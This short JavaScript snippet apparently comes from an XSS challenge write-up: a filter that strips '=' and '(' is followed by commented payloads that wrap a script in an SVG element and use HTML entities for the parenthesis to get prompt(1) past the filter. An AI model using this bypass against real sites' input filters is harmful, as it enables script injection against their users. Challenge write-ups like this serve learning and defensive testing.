function escape(input) {
    //                      v-- frowny face
    input = input.replace(/[=(]/g, '');

    // ok seriously, disallows equal signs and open parenthesis
    return input;
}        

//    <svg><script>prompt&#40 1 &#41</script>

// better solution
// <svg><script>prompt&lpar;1)</script>
// We inject the script tags inside an svg, 
// then we can use hex encoding or html encoding to bypass the filter 
// because of the XML parsing property.
// The elements inside the svg is considered to be XML elements
